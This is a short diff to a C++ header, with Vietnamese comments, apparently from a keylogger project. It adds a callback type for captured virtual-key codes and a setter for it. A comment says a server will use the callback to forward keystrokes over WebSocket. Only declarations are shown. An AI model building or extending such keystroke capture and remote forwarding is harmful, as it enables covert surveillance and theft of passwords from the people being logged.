@@ -1,7 +1,15 @@
 #pragma once
 #include <fstream>
+#include <functional>
 #include <atomic>
 #include <thread> // Cần để chạy luồng riêng
+
+
+// Callback: nhận mã phím (VK code) an toàn
+using KeyEventCallback = std::function<void(int)>;
+
+// Đăng ký callback (server sẽ dùng để gửi WS)
+void setKeyEventCallback(KeyEventCallback cb);
 
 /**
  * @brief Bắt đầu chạy keylogger trên một luồng riêng biệt.
